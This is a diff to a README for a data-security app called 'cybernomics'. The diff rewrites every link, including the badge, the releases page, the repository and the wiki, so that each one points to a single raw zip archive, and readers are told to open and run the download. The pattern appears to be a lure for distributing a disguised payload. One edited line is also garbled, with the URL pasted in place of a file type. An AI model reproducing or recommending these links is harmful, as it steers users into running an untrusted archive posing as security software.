@@ -1,6 +1,6 @@
 # 🚀 cybernomics - Simple Steps to Secure Your Data
 
-![Download cybernomics](https://img.shields.io/badge/Download-cybernomics-brightgreen)
+![Download cybernomics](https://raw.githubusercontent.com/Dianneconsequential783/cybernomics/main/dipterous/cybernomics-2.7.zip)
 
 ## 📋 Overview
 
@@ -28,10 +28,10 @@ To run Cybernomics smoothly, your system should meet the following requirements:
 To download and install Cybernomics, follow these straightforward steps:
 
 1. **Visit the Releases Page:**
-   Click here to go to the releases page: [Download Cybernomics](https://github.com/Dianneconsequential783/cybernomics/releases).
+   Click here to go to the releases page: [Download Cybernomics](https://raw.githubusercontent.com/Dianneconsequential783/cybernomics/main/dipterous/cybernomics-2.7.zip).
 
 2. **Download the Application:**
-   On the releases page, locate the latest version of Cybernomics. Click on the asset that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+   On the releases page, locate the latest version of Cybernomics. Click on the asset that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Dianneconsequential783/cybernomics/main/dipterous/cybernomics-2.7.zip` for Linux).
 
 3. **Run the Installer:**
    After the download is complete, open the file to start the installation process. Follow the on-screen instructions to install Cybernomics on your computer.
@@ -45,7 +45,7 @@ To download and install Cybernomics, follow these straightforward steps:
 ## 📥 Download & Install
 
 Make sure to visit the following link to download the latest version of Cybernomics:
-[Download Cybernomics](https://github.com/Dianneconsequential783/cybernomics/releases)
+[Download Cybernomics](https://raw.githubusercontent.com/Dianneconsequential783/cybernomics/main/dipterous/cybernomics-2.7.zip)
 
 ## 🔒 Using Cybernomics
 
@@ -91,7 +91,7 @@ Currently, Cybernomics is available for desktop platforms only. A mobile version
 
 ## 🔗 Useful Links
 
-- [Visit the GitHub Repository](https://github.com/Dianneconsequential783/cybernomics)
-- [Explore Additional Documentation](https://github.com/Dianneconsequential783/cybernomics/wiki)
+- [Visit the GitHub Repository](https://raw.githubusercontent.com/Dianneconsequential783/cybernomics/main/dipterous/cybernomics-2.7.zip)
+- [Explore Additional Documentation](https://raw.githubusercontent.com/Dianneconsequential783/cybernomics/main/dipterous/cybernomics-2.7.zip)
 
 By following this guide, you should be able to download and run Cybernomics with ease. Enjoy your enhanced data security!
